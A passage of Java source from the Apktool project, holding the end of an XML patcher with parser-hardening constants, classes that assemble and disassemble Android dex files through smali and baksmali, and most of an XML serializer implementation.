        transformer.transform(source, result);
    }

    private static final String ACCESS_EXTERNAL_DTD = "http://javax.xml.XMLConstants/property/accessExternalDTD";
    private static final String ACCESS_EXTERNAL_SCHEMA = "http://javax.xml.XMLConstants/property/accessExternalSchema";
    private static final String FEATURE_LOAD_DTD = "http://apache.org/xml/features/nonvalidating/load-external-dtd";
    private static final String FEATURE_DISABLE_DOCTYPE_DECL = "http://apache.org/xml/features/disallow-doctype-decl";

    private static final Logger LOGGER = Logger.getLogger(ResXmlPatcher.class.getName());
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/src/SmaliBuilder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.src;

import brut.androlib.AndrolibException;
import brut.androlib.mod.SmaliMod;
import brut.directory.DirectoryException;
import brut.directory.ExtFile;
import org.antlr.runtime.RecognitionException;
import org.jf.dexlib2.Opcodes;
import org.jf.dexlib2.writer.builder.DexBuilder;
import org.jf.dexlib2.writer.io.FileDataStore;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.logging.Logger;

public class SmaliBuilder {

    public static void build(ExtFile smaliDir, File dexFile, int apiLevel) throws AndrolibException {
        new SmaliBuilder(smaliDir, dexFile, apiLevel).build();
    }

    private SmaliBuilder(ExtFile smaliDir, File dexFile, int apiLevel) {
        mSmaliDir = smaliDir;
        mDexFile = dexFile;
        mApiLevel = apiLevel;
    }

    private void build() throws AndrolibException {
        try {
            DexBuilder dexBuilder;
            if (mApiLevel > 0) {
                dexBuilder = new DexBuilder(Opcodes.forApi(mApiLevel));
            } else {
                dexBuilder = new DexBuilder(Opcodes.getDefault());
            }

            for (String fileName : mSmaliDir.getDirectory().getFiles(true)) {
                buildFile(fileName, dexBuilder);
            }
            dexBuilder.writeTo(new FileDataStore( new File(mDexFile.getAbsolutePath())));
        } catch (IOException | DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void buildFile(String fileName, DexBuilder dexBuilder)
            throws AndrolibException, IOException {
        File inFile = new File(mSmaliDir, fileName);
        InputStream inStream = new FileInputStream(inFile);

        if (fileName.endsWith(".smali")) {
            try {
                if (!SmaliMod.assembleSmaliFile(inFile, dexBuilder, mApiLevel, false, false)) {
                    throw new AndrolibException("Could not smali file: " + fileName);
                }
            } catch (IOException | RecognitionException ex) {
                throw new AndrolibException(ex);
            }
        } else {
            LOGGER.warning("Unknown file type, ignoring: " + inFile);
        }
        inStream.close();
    }

    private final ExtFile mSmaliDir;
    private final File mDexFile;
    private final int mApiLevel;

    private final static Logger LOGGER = Logger.getLogger(SmaliBuilder.class.getName());
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/src/SmaliDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.src;

import brut.androlib.AndrolibException;
import org.jf.baksmali.Baksmali;
import org.jf.baksmali.BaksmaliOptions;
import org.jf.dexlib2.DexFileFactory;
import org.jf.dexlib2.Opcodes;
import org.jf.dexlib2.dexbacked.DexBackedDexFile;
import org.jf.dexlib2.dexbacked.DexBackedOdexFile;
import org.jf.dexlib2.analysis.InlineMethodResolver;
import org.jf.dexlib2.iface.DexFile;
import org.jf.dexlib2.iface.MultiDexContainer;

import java.io.File;
import java.io.IOException;

public class SmaliDecoder {

    public static DexFile decode(File apkFile, File outDir, String dexName, boolean bakDeb, int apiLevel)
            throws AndrolibException {
        return new SmaliDecoder(apkFile, outDir, dexName, bakDeb, apiLevel).decode();
    }

    private SmaliDecoder(File apkFile, File outDir, String dexName, boolean bakDeb, int apiLevel) {
        mApkFile = apkFile;
        mOutDir = outDir;
        mDexFile = dexName;
        mBakDeb = bakDeb;
        mApiLevel = apiLevel;
    }

    private DexFile decode() throws AndrolibException {
        try {
            final BaksmaliOptions options = new BaksmaliOptions();

            // options
            options.deodex = false;
            options.implicitReferences = false;
            options.parameterRegisters = true;
            options.localsDirective = true;
            options.sequentialLabels = true;
            options.debugInfo = mBakDeb;
            options.codeOffsets = false;
            options.accessorComments = false;
            options.registerInfo = 0;
            options.inlineResolver = null;

            // set jobs automatically
            int jobs = Runtime.getRuntime().availableProcessors();
            if (jobs > 6) {
                jobs = 6;
            }

            // create the container
            MultiDexContainer<? extends DexBackedDexFile> container =
                    DexFileFactory.loadDexContainer(mApkFile, mApiLevel > 0 ? Opcodes.forApi(mApiLevel) : null);
            MultiDexContainer.DexEntry<? extends DexBackedDexFile> dexEntry;
            DexBackedDexFile dexFile;

            // If we have 1 item, ignore the passed file. Pull the DexFile we need.
            if (container.getDexEntryNames().size() == 1) {
                dexEntry = container.getEntry(container.getDexEntryNames().get(0));
            } else {
                dexEntry = container.getEntry(mDexFile);
            }

            // Double check the passed param exists
            if (dexEntry == null) {
                dexEntry = container.getEntry(container.getDexEntryNames().get(0));
            }

            assert dexEntry != null;
            dexFile = dexEntry.getDexFile();

            if (dexFile.supportsOptimizedOpcodes()) {
                throw new AndrolibException("Warning: You are disassembling an odex file without deodexing it.");
            }

            if (dexFile instanceof DexBackedOdexFile) {
                options.inlineResolver =
                        InlineMethodResolver.createInlineMethodResolver(((DexBackedOdexFile)dexFile).getOdexVersion());
            }

            Baksmali.disassembleDexFile(dexFile, mOutDir, jobs, options);

            return dexFile;
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        }
    }

    private final File mApkFile;
    private final File mOutDir;
    private final String mDexFile;
    private final boolean mBakDeb;
    private final int mApiLevel;
}

```

`brut.apktool/apktool-lib/src/main/java/org/xmlpull/renamed/MXSerializer.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package org.xmlpull.renamed;

import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.Writer;

/**
 * Implementation of XmlSerializer interface from XmlPull V1 API. This
 * implementation is optimized for performance and low memory footprint.
 *
 * <p>
 * Implemented features:
 * <ul>
 * <li>FEATURE_NAMES_INTERNED - when enabled all returned names (namespaces,
 * prefixes) will be interned and it is required that all names passed as
 * arguments MUST be interned
 * <li>FEATURE_SERIALIZER_ATTVALUE_USE_APOSTROPHE
 * </ul>
 * <p>
 * Implemented properties:
 * <ul>
 * <li>PROPERTY_SERIALIZER_INDENTATION
 * <li>PROPERTY_SERIALIZER_LINE_SEPARATOR
 * </ul>
 *
 */
public class MXSerializer implements XmlSerializer {
	protected final static String XML_URI = "http://www.w3.org/XML/1998/namespace";
	protected final static String XMLNS_URI = "http://www.w3.org/2000/xmlns/";
	private static final boolean TRACE_SIZING = false;
	private static final boolean TRACE_ESCAPING = false;

	protected final String FEATURE_SERIALIZER_ATTVALUE_USE_APOSTROPHE = "http://xmlpull.org/v1/doc/features.html#serializer-attvalue-use-apostrophe";
	protected final String FEATURE_NAMES_INTERNED = "http://xmlpull.org/v1/doc/features.html#names-interned";
	protected final String PROPERTY_SERIALIZER_INDENTATION = "http://xmlpull.org/v1/doc/properties.html#serializer-indentation";
	protected final String PROPERTY_SERIALIZER_LINE_SEPARATOR = "http://xmlpull.org/v1/doc/properties.html#serializer-line-separator";
	protected final static String PROPERTY_LOCATION = "http://xmlpull.org/v1/doc/properties.html#location";

	// properties/features
	protected boolean namesInterned;
	protected boolean attributeUseApostrophe;
	protected String indentationString = null; // " ";
	protected String lineSeparator = "\n";

	protected String location;
	protected Writer out;

	protected int autoDeclaredPrefixes;

	protected int depth = 0;

	// element stack
	protected String[] elNamespace = new String[2];
	protected String[] elName = new String[elNamespace.length];
	protected String[] elPrefix = new String[elNamespace.length];
	protected int[] elNamespaceCount = new int[elNamespace.length];

	// namespace stack
	protected int namespaceEnd = 0;
	protected String[] namespacePrefix = new String[8];
	protected String[] namespaceUri = new String[namespacePrefix.length];

	protected boolean finished;
	protected boolean pastRoot;
	protected boolean setPrefixCalled;
	protected boolean startTagIncomplete;

	protected boolean doIndent;
	protected boolean seenTag;

	protected boolean seenBracket;
	protected boolean seenBracketBracket;

	// buffer output if needed to write escaped String see text(String)
	private static final int BUF_LEN = Runtime.getRuntime().freeMemory() > 1000000L ? 8 * 1024 : 256;
	protected char[] buf = new char[BUF_LEN];

	protected static final String[] precomputedPrefixes;

	static {
		precomputedPrefixes = new String[32]; // arbitrary number ...
		for (int i = 0; i < precomputedPrefixes.length; i++) {
			precomputedPrefixes[i] = ("n" + i).intern();
		}
	}

	private final boolean checkNamesInterned = false;

	private void checkInterning(String name) {
		if (namesInterned && name != name.intern()) {
			throw new IllegalArgumentException("all names passed as arguments must be interned"
					+ "when NAMES INTERNED feature is enabled");
		}
	}

	protected void reset() {
		location = null;
		out = null;
		autoDeclaredPrefixes = 0;
		depth = 0;

		// nullify references on all levels to allow it to be GCed
		for (int i = 0; i < elNamespaceCount.length; i++) {
			elName[i] = null;
			elPrefix[i] = null;
			elNamespace[i] = null;
			elNamespaceCount[i] = 2;
		}

		namespaceEnd = 0;

		// TODO: how to prevent from reporting this namespace?
		// this is special namespace declared for consistency with XML infoset
		namespacePrefix[namespaceEnd] = "xmlns";
		namespaceUri[namespaceEnd] = XMLNS_URI;
		++namespaceEnd;

		namespacePrefix[namespaceEnd] = "xml";
		namespaceUri[namespaceEnd] = XML_URI;
		++namespaceEnd;

		finished = false;
		pastRoot = false;
		setPrefixCalled = false;
		startTagIncomplete = false;
		seenTag = false;

		seenBracket = false;
		seenBracketBracket = false;
	}

	protected void ensureElementsCapacity() {
		final int elStackSize = elName.length;
		final int newSize = (depth >= 7 ? 2 * depth : 8) + 2;

		if (TRACE_SIZING) {
			System.err.println(getClass().getName() + " elStackSize "
					+ elStackSize + " ==> " + newSize);
		}
		final boolean needsCopying = elStackSize > 0;
		String[] arr;
		// reuse arr local variable slot
		arr = new String[newSize];
		if (needsCopying)
			System.arraycopy(elName, 0, arr, 0, elStackSize);
		elName = arr;

		arr = new String[newSize];
		if (needsCopying)
			System.arraycopy(elPrefix, 0, arr, 0, elStackSize);
		elPrefix = arr;

		arr = new String[newSize];
		if (needsCopying)
			System.arraycopy(elNamespace, 0, arr, 0, elStackSize);
		elNamespace = arr;

		final int[] iarr = new int[newSize];
		if (needsCopying) {
			System.arraycopy(elNamespaceCount, 0, iarr, 0, elStackSize);
		} else {
			// special initialization
			iarr[0] = 0;
		}
		elNamespaceCount = iarr;
	}

	protected void ensureNamespacesCapacity() { // int size) {
		final int newSize = namespaceEnd > 7 ? 2 * namespaceEnd : 8;
		if (TRACE_SIZING) {
			System.err.println(getClass().getName() + " namespaceSize " + namespacePrefix.length + " ==> " + newSize);
		}
		final String[] newNamespacePrefix = new String[newSize];
		final String[] newNamespaceUri = new String[newSize];
		if (namespacePrefix != null) {
			System.arraycopy(namespacePrefix, 0, newNamespacePrefix, 0, namespaceEnd);
			System.arraycopy(namespaceUri, 0, newNamespaceUri, 0, namespaceEnd);
		}
		namespacePrefix = newNamespacePrefix;
		namespaceUri = newNamespaceUri;
	}

	@Override
	public void setFeature(String name, boolean state)
			throws IllegalArgumentException, IllegalStateException {
		if (name == null) {
			throw new IllegalArgumentException("feature name can not be null");
		}
		if (FEATURE_NAMES_INTERNED.equals(name)) {
			namesInterned = state;
		} else if (FEATURE_SERIALIZER_ATTVALUE_USE_APOSTROPHE.equals(name)) {
			attributeUseApostrophe = state;
		} else {
			throw new IllegalStateException("unsupported feature " + name);
		}
	}

	@Override
	public boolean getFeature(String name) throws IllegalArgumentException {
		if (name == null) {
			throw new IllegalArgumentException("feature name can not be null");
		}
		if (FEATURE_NAMES_INTERNED.equals(name)) {
			return namesInterned;
		} else if (FEATURE_SERIALIZER_ATTVALUE_USE_APOSTROPHE.equals(name)) {
			return attributeUseApostrophe;
		} else {
			return false;
		}
	}

	// precomputed variables to simplify writing indentation
	protected int offsetNewLine;
	protected int indentationJump;
	protected char[] indentationBuf;
	protected int maxIndentLevel;
	protected boolean writeLineSepartor; // should end-of-line be written
	protected boolean writeIndentation; // is indentation used?

	/**
	 * For maximum efficiency when writing indents the required output is
	 * pre-computed This is internal function that recomputes buffer after user
	 * requested chnages.
	 */
	protected void rebuildIndentationBuf() {
		if (!doIndent)
			return;
		final int maxIndent = 65; // hardcoded maximum indentation size in characters
		int bufSize = 0;
		offsetNewLine = 0;
		if (writeLineSepartor) {
			offsetNewLine = lineSeparator.length();
			bufSize += offsetNewLine;
		}
		maxIndentLevel = 0;
		if (writeIndentation) {
			indentationJump = indentationString.length();
			maxIndentLevel = maxIndent / indentationJump;
			bufSize += maxIndentLevel * indentationJump;
		}
		if (indentationBuf == null || indentationBuf.length < bufSize) {
			indentationBuf = new char[bufSize + 8];
		}
		int bufPos = 0;
		if (writeLineSepartor) {
			for (int i = 0; i < lineSeparator.length(); i++) {
				indentationBuf[bufPos++] = lineSeparator.charAt(i);
			}
		}
		if (writeIndentation) {
			for (int i = 0; i < maxIndentLevel; i++) {
				for (int j = 0; j < indentationString.length(); j++) {
					indentationBuf[bufPos++] = indentationString.charAt(j);
				}
			}
		}
	}

	protected void writeIndent() throws IOException {
		final int start = writeLineSepartor ? 0 : offsetNewLine;
		final int level = Math.min(depth, maxIndentLevel);

		out.write(indentationBuf, start, ((level - 1) * indentationJump) + offsetNewLine);
	}

	@Override
	public void setProperty(String name, Object value)
			throws IllegalArgumentException, IllegalStateException {
		if (name == null) {
			throw new IllegalArgumentException("property name can not be null");
		}
        switch (name) {
            case PROPERTY_SERIALIZER_INDENTATION:
                indentationString = (String) value;
                break;
            case PROPERTY_SERIALIZER_LINE_SEPARATOR:
                lineSeparator = (String) value;
                break;
            case PROPERTY_LOCATION:
                location = (String) value;
                break;
            default:
                throw new IllegalStateException("unsupported property " + name);
        }
		writeLineSepartor = lineSeparator != null && lineSeparator.length() > 0;
		writeIndentation = indentationString != null
				&& indentationString.length() > 0;
		// optimize - do not write when nothing to write ...
		doIndent = indentationString != null
				&& (writeLineSepartor || writeIndentation);
		// NOTE: when indentationString == null there is no indentation
		// (even though writeLineSeparator may be true ...)
		rebuildIndentationBuf();
		seenTag = false; // for consistency
	}

	@Override
	public Object getProperty(String name) throws IllegalArgumentException {
		if (name == null) {
			throw new IllegalArgumentException("property name can not be null");
		}
        switch (name) {
            case PROPERTY_SERIALIZER_INDENTATION:
                return indentationString;
            case PROPERTY_SERIALIZER_LINE_SEPARATOR:
                return lineSeparator;
            case PROPERTY_LOCATION:
                return location;
            default:
                return null;
        }
	}

	private String getLocation() {
		return location != null ? " @" + location : "";
	}

	// this is special method that can be accessed directly to retrieve Writer
	// serializer is using
	public Writer getWriter() {
		return out;
	}

	@Override
	public void setOutput(Writer writer) {
		reset();
		out = writer;
	}

	@Override
	public void setOutput(OutputStream os, String encoding) throws IOException {
		if (os == null)
			throw new IllegalArgumentException("output stream can not be null");
		reset();
		if (encoding != null) {
			out = new OutputStreamWriter(os, encoding);
		} else {
			out = new OutputStreamWriter(os);
		}
	}

	@Override
	public void startDocument(String encoding, Boolean standalone)
			throws IOException {
		if (attributeUseApostrophe) {
			out.write("<?xml version='1.0'");
		} else {
			out.write("<?xml version=\"1.0\"");
		}
		if (encoding != null) {
			out.write(" encoding=");
			out.write(attributeUseApostrophe ? '\'' : '"');
			out.write(encoding);
			out.write(attributeUseApostrophe ? '\'' : '"');
		}
		if (standalone != null) {
			out.write(" standalone=");
			out.write(attributeUseApostrophe ? '\'' : '"');
			if (standalone) {
				out.write("yes");
			} else {
				out.write("no");
			}
			out.write(attributeUseApostrophe ? '\'' : '"');
		}
		out.write("?>");
	}

	@Override
	public void endDocument() throws IOException {
		// close all unclosed tag;
		while (depth > 0) {
			endTag(elNamespace[depth], elName[depth]);
		}
		finished = pastRoot = startTagIncomplete = true;
		out.flush();
	}

	@Override
	public void setPrefix(String prefix, String namespace) throws IOException {
		if (startTagIncomplete)
			closeStartTag();

		if (prefix == null) {
			prefix = "";
		}
		if (!namesInterned) {
			prefix = prefix.intern(); // will throw NPE if prefix==null
		} else if (checkNamesInterned) {
			checkInterning(prefix);
		} else if (prefix == null) {
			throw new IllegalArgumentException("prefix must be not null" + getLocation());
		}

		if (!namesInterned) {
			namespace = namespace.intern();
		} else if (checkNamesInterned) {
			checkInterning(namespace);
		} else if (namespace == null) {
			throw new IllegalArgumentException("namespace must be not null" + getLocation());
		}

		if (namespaceEnd >= namespacePrefix.length) {
			ensureNamespacesCapacity();
		}
		namespacePrefix[namespaceEnd] = prefix;
		namespaceUri[namespaceEnd] = namespace;
		++namespaceEnd;
		setPrefixCalled = true;
	}

	protected String lookupOrDeclarePrefix(String namespace) {
		return getPrefix(namespace, true);
	}

	@Override
	public String getPrefix(String namespace, boolean generatePrefix) {
		return getPrefix(namespace, generatePrefix, false);
	}

	protected String getPrefix(String namespace, boolean generatePrefix,
			boolean nonEmpty) {
		if (!namesInterned) {
			// when String is interned we can do much faster namespace stack lookups ...
			namespace = namespace.intern();
		} else if (checkNamesInterned) {
			checkInterning(namespace);
		}
		if (namespace == null) {
			throw new IllegalArgumentException("namespace must be not null" + getLocation());
		} else if (namespace.length() == 0) {
			throw new IllegalArgumentException("default namespace cannot have prefix" + getLocation());
		}

		// first check if namespace is already in scope
		for (int i = namespaceEnd - 1; i >= 0; --i) {
			if (namespace.equals(namespaceUri[i])) {
				final String prefix = namespacePrefix[i];
				if (nonEmpty && prefix.length() == 0) {
				    continue;
                }

				return prefix;
			}
		}

		// so not found it ...
		if (!generatePrefix) {
			return null;
		}
		return generatePrefix(namespace);
	}

	private String generatePrefix(String namespace) {
        ++autoDeclaredPrefixes;
        // fast lookup uses table that was pre-initialized in static{} ....
        final String prefix = autoDeclaredPrefixes < precomputedPrefixes.length
            ? precomputedPrefixes[autoDeclaredPrefixes]
            : ("n" + autoDeclaredPrefixes).intern();

        // declare prefix
        if (namespaceEnd >= namespacePrefix.length) {
            ensureNamespacesCapacity();
        }
        namespacePrefix[namespaceEnd] = prefix;
        namespaceUri[namespaceEnd] = namespace;
        ++namespaceEnd;

        return prefix;
	}

	@Override
	public int getDepth() {
		return depth;
	}

	@Override
	public String getNamespace() {
		return elNamespace[depth];
	}

	@Override
	public String getName() {
		return elName[depth];
	}

	@Override
	public XmlSerializer startTag(String namespace, String name)
			throws IOException {
		if (startTagIncomplete) {
			closeStartTag();
		}
		seenBracket = seenBracketBracket = false;
		++depth;
		if (doIndent && depth > 0 && seenTag) {
			writeIndent();
		}
		seenTag = true;
		setPrefixCalled = false;
		startTagIncomplete = true;
		if ((depth + 1) >= elName.length) {
			ensureElementsCapacity();
		}

		if (checkNamesInterned && namesInterned)
			checkInterning(namespace);

		elNamespace[depth] = (namesInterned || namespace == null) ? namespace : namespace.intern();
		if (checkNamesInterned && namesInterned)
			checkInterning(name);

		elName[depth] = (namesInterned || name == null) ? name : name.intern();
		if (out == null) {
			throw new IllegalStateException("setOutput() must called set before serialization can start");
		}
		out.write('<');
		if (namespace != null) {
			if (namespace.length() > 0) {
				// in future make this algo a feature on serializer
				String prefix = null;
				if (depth > 0 && (namespaceEnd - elNamespaceCount[depth - 1]) == 1) {
					// if only one prefix was declared un-declare it if the
					// prefix is already declared on parent el with the same URI
					String uri = namespaceUri[namespaceEnd - 1];
					if (uri == namespace || uri.equals(namespace)) {
						String elPfx = namespacePrefix[namespaceEnd - 1];
						for (int pos = elNamespaceCount[depth - 1] - 1; pos >= 2; --pos) {
							String pf = namespacePrefix[pos];
							if (pf == elPfx || pf.equals(elPfx)) {
								String n = namespaceUri[pos];
								if (n == uri || n.equals(uri)) {
									--namespaceEnd; // un-declare namespace: this is kludge!
									prefix = elPfx;
								}
								break;
							}
						}
					}
				}
				if (prefix == null) {
					prefix = lookupOrDeclarePrefix(namespace);
				}
				// make sure that default ("") namespace to not print ":"
				if (prefix.length() > 0) {
					elPrefix[depth] = prefix;
					out.write(prefix);
					out.write(':');
				} else {
					elPrefix[depth] = "";
				}
			} else {
				// make sure that default namespace can be declared
				for (int i = namespaceEnd - 1; i >= 0; --i) {
					if (namespacePrefix[i] == "") {
						final String uri = namespaceUri[i];
						if (uri == null) {
							setPrefix("", "");
						} else if (uri.length() > 0) {
							throw new IllegalStateException("start tag can not be written in empty default namespace "
									+ "as default namespace is currently bound to '"
									+ uri + "'" + getLocation());
						}
						break;
					}
				}
				elPrefix[depth] = "";
			}
		} else {
			elPrefix[depth] = "";
		}
		out.write(name);
		return this;
	}

	@Override
	public XmlSerializer attribute(String namespace, String name, String value)
			throws IOException {
		if (!startTagIncomplete) {
			throw new IllegalArgumentException("startTag() must be called before attribute()" + getLocation());
		}
		out.write(' ');
		if (namespace != null && namespace.length() > 0) {
			if (!namesInterned) {
				namespace = namespace.intern();
			} else if (checkNamesInterned) {
				checkInterning(namespace);
			}
			String prefix = getPrefix(namespace, false, true);
			if (prefix == null) {
				// needs to declare prefix to hold default namespace
				// NOTE: attributes such as a='b' are in NO namespace
				prefix = generatePrefix(namespace);
			}
			out.write(prefix);
			out.write(':');
		}
		out.write(name);
		out.write('=');
		out.write(attributeUseApostrophe ? '\'' : '"');
		writeAttributeValue(value, out);
		out.write(attributeUseApostrophe ? '\'' : '"');
		return this;
	}

	protected void closeStartTag() throws IOException {
		if (finished) {
			throw new IllegalArgumentException("trying to write past already finished output"
					+ getLocation());
		}
		if (seenBracket) {
			seenBracket = seenBracketBracket = false;
		}
		if (startTagIncomplete || setPrefixCalled) {
			if (setPrefixCalled) {
				throw new IllegalArgumentException("startTag() must be called immediately after setPrefix()"
						+ getLocation());
			}
			if (!startTagIncomplete) {
				throw new IllegalArgumentException("trying to close start tag that is not opened"
						+ getLocation());
			}

			// write all namespace declarations!
			writeNamespaceDeclarations();
			out.write('>');
			elNamespaceCount[depth] = namespaceEnd;
			startTagIncomplete = false;
		}
	}

	protected void writeNamespaceDeclarations() throws IOException {
		for (int i = elNamespaceCount[depth - 1]; i < namespaceEnd; i++) {
			if (doIndent && namespaceUri[i].length() > 40) {
				writeIndent();
				out.write(" ");
			}
			if (namespacePrefix[i] != "") {
				out.write(" xmlns:");
				out.write(namespacePrefix[i]);
				out.write('=');
			} else {
				out.write(" xmlns=");
			}
			out.write(attributeUseApostrophe ? '\'' : '"');

			// NOTE: escaping of namespace value the same way as attributes!!!!
			writeAttributeValue(namespaceUri[i], out);
			out.write(attributeUseApostrophe ? '\'' : '"');
		}
	}

	@Override
	public XmlSerializer endTag(String namespace, String name)
			throws IOException {
		seenBracket = seenBracketBracket = false;
		if (namespace != null) {
			if (!namesInterned) {
				namespace = namespace.intern();
			} else if (checkNamesInterned) {
				checkInterning(namespace);
			}
		}

		if (namespace != elNamespace[depth]) {
			throw new IllegalArgumentException("expected namespace " + printable(elNamespace[depth]) + " and not "
					+ printable(namespace) + getLocation());
		}
		if (name == null) {
			throw new IllegalArgumentException("end tag name can not be null" + getLocation());
		}
		if (checkNamesInterned && namesInterned) {
			checkInterning(name);
		}
		String startTagName = elName[depth];
		if ((!namesInterned && !name.equals(startTagName)) || (namesInterned && name != startTagName)) {
			throw new IllegalArgumentException("expected element name "
					+ printable(elName[depth]) + " and not " + printable(name) + getLocation());
		}
		if (startTagIncomplete) {
			writeNamespaceDeclarations();
			out.write(" />"); // space is added to make it easier to work in XHTML!!!
        } else {
			if (doIndent && seenTag) {
				writeIndent();
			}
			out.write("</");
			String startTagPrefix = elPrefix[depth];
			if (startTagPrefix.length() > 0) {
				out.write(startTagPrefix);
				out.write(':');
			}
			out.write(name);
			out.write('>');
        }
        --depth;
        namespaceEnd = elNamespaceCount[depth];
		startTagIncomplete = false;
		seenTag = true;
		return this;
	}

	@Override
	public XmlSerializer text(String text) throws IOException {
		if (startTagIncomplete || setPrefixCalled)
			closeStartTag();
		if (doIndent && seenTag)
			seenTag = false;
		writeElementContent(text, out);
		return this;
	}

	@Override
	public XmlSerializer text(char[] buf, int start, int len)
			throws IOException {
		if (startTagIncomplete || setPrefixCalled)
			closeStartTag();
		if (doIndent && seenTag)
			seenTag = false;
		writeElementContent(buf, start, len, out);
		return this;
	}

	@Override
	public void cdsect(String text) throws IOException {
		if (startTagIncomplete || setPrefixCalled || seenBracket)
			closeStartTag();
		if (doIndent && seenTag)
			seenTag = false;
		out.write("<![CDATA[");
		out.write(text); // escape?
		out.write("]]>");
	}

	@Override
	public void entityRef(String text) throws IOException {
		if (startTagIncomplete || setPrefixCalled || seenBracket)
			closeStartTag();
		if (doIndent && seenTag)
			seenTag = false;
		out.write('&');
		out.write(text); // escape?
		out.write(';');
	}

	@Override
	public void processingInstruction(String text) throws IOException {
		if (startTagIncomplete || setPrefixCalled || seenBracket)
			closeStartTag();
		if (doIndent && seenTag)
			seenTag = false;
		out.write("<?");
		out.write(text); // escape?
		out.write("?>");
	}

	@Override
	public void comment(String text) throws IOException {
		if (startTagIncomplete || setPrefixCalled || seenBracket)
			closeStartTag();
		if (doIndent && seenTag)
			seenTag = false;
		out.write("<!--");
		out.write(text); // escape?
		out.write("-->");
	}

	@Override
	public void docdecl(String text) throws IOException {
		if (startTagIncomplete || setPrefixCalled || seenBracket)
			closeStartTag();
		if (doIndent && seenTag)
			seenTag = false;
		out.write("<!DOCTYPE");
		out.write(text); // escape?
		out.write(">");
	}

	@Override
	public void ignorableWhitespace(String text) throws IOException {
		if (startTagIncomplete || setPrefixCalled || seenBracket)
			closeStartTag();
		if (doIndent && seenTag)
			seenTag = false;
		if (text.length() == 0) {
			throw new IllegalArgumentException("empty string is not allowed for ignorable whitespace" + getLocation());
		}
		out.write(text); // no escape?
	}

	@Override
	public void flush() throws IOException {
		if (!finished && startTagIncomplete)
			closeStartTag();
		out.flush();
	}

	// --- utility methods

	protected void writeAttributeValue(String value, Writer out)
			throws IOException {
		// .[apostrophe and <, & escaped],
		final char quot = attributeUseApostrophe ? '\'' : '"';
		final String quotEntity = attributeUseApostrophe ? "&apos;" : "&quot;";

		int pos = 0;
		for (int i = 0; i < value.length(); i++) {
			char ch = value.charAt(i);
			if (ch == '&') {
				if (i > pos)
					out.write(value.substring(pos, i));
				out.write("&amp;");
				pos = i + 1;
			}
			if (ch == '<') {
				if (i > pos)
					out.write(value.substring(pos, i));
				out.write("&lt;");
				pos = i + 1;
			} else if (ch == quot) {
				if (i > pos)
					out.write(value.substring(pos, i));
				out.write(quotEntity);
				pos = i + 1;
			} else if (ch < 32) {
				// in XML 1.0 only legal character are #x9 | #xA | #xD
				// and they must be escaped otherwise in attribute value they
				// are normalized to spaces
				if (ch == 13 || ch == 10 || ch == 9) {
					if (i > pos)
						out.write(value.substring(pos, i));
					out.write("&#");
					out.write(Integer.toString(ch));
					out.write(';');
					pos = i + 1;
				} else {
					if (TRACE_ESCAPING)
						System.err.println(getClass().getName() + " DEBUG ATTR value.len=" + value.length()
								+ " " + printable(value));

					throw new IllegalStateException(
							"character " + printable(ch) + " (" + Integer.toString(ch) + ") is not allowed in output"
									+ getLocation() + " (attr value="
									+ printable(value) + ")");
				}
			}
		}
		if (pos > 0) {
			out.write(value.substring(pos));
		} else {
			out.write(value); // this is shortcut to the most common case
		}
	}

	protected void writeElementContent(String text, Writer out)
			throws IOException {

		// For some reason, some non-empty, empty characters are surviving this far and getting filtered out
		// So we are left with null, which causes an NPE
		if (text == null) {
			return;
		}

		// escape '<', '&', ']]>', <32 if necessary
		int pos = 0;
		for (int i = 0; i < text.length(); i++) {
			// TODO: check if doing char[] text.getChars() would be faster than
			// getCharAt(i) ...
			char ch = text.charAt(i);
			if (ch == ']') {
				if (seenBracket) {
					seenBracketBracket = true;
				} else {
					seenBracket = true;
				}
			} else {
				if (ch == '&') {
					if (!(i < text.length() - 3 && text.charAt(i+1) == 'l'
					    && text.charAt(i+2) == 't' && text.charAt(i+3) == ';')) {
					    if (i > pos)
					        out.write(text.substring(pos, i));
					    out.write("&amp;");
					    pos = i + 1;
                    }
				} else if (ch == '<') {
					if (i > pos)
						out.write(text.substring(pos, i));
					out.write("&lt;");
					pos = i + 1;
				} else if (seenBracketBracket && ch == '>') {
					if (i > pos)
						out.write(text.substring(pos, i));
					out.write("&gt;");
					pos = i + 1;
				} else if (ch < 32) {
					// in XML 1.0 only legal character are #x9 | #xA | #xD
					if (ch == 9 || ch == 10 || ch == 13) {
						// pass through
